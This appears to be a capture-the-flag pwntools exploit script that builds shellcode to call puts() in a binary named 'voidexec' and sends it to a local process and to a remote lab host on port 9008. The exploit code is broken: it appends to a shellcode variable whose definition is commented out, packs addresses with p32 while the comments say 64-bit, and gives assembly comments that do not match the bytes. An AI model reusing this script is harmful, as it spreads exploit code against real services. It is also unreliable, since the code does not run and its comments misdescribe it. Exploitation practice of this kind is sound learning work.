import sys, socket; 
from pwn import *

# Start process
p = process("./voidexec")  # Change to actual binary name

# Get function addresses
elf = ELF("./voidexec")
puts_plt = p32(elf.plt["puts"])  # Get `puts()` address (64-bit)
mprotect_plt = p32(elf.plt["mprotect"])  # Get `mprotect()` address (64-bit)

# Construct shellcode
#shellcode = b"\x48\xc7\xc7\x00\x00\xde\xc0"  # mov rdi, 0xc0de0000 (memory region)
#shellcode += b"\x48\xc7\xc6\x64\x00\x00\x00"  # mov rsi, 100 (size)
#shellcode += b"\x48\xc7\xc2\x07\x00\x00\x00"  # mov rdx, 7 (PROT_READ | PROT_WRITE | PROT_EXEC)
#shellcode += mprotect_plt  # call mprotect@plt (fix address)

# Construct the shellcode (64-bit calling convention)
shellcode += b"\x68\x6f\x74\x6f\x0a"  # push "oto\n"
shellcode += b"\x68\x74\x6f\x00\x00"  # push "to"
shellcode += b"\x89\xe3"  # mov rbx, rsp (pointer to "toto\n")
shellcode += puts_plt  # Call `puts()`

# Ensure shellcode is exactly 100 bytes (padding with NOPs)
shellcode = shellcode.ljust(100, b"\x90")
print(shellcode)

# Send payload
p.send(shellcode)
p.interactive()

s = socket.create_connection(('10.10.127.59', 9008))
s.sendall(shellcode)
print(s.recv(8092).decode())
s.close()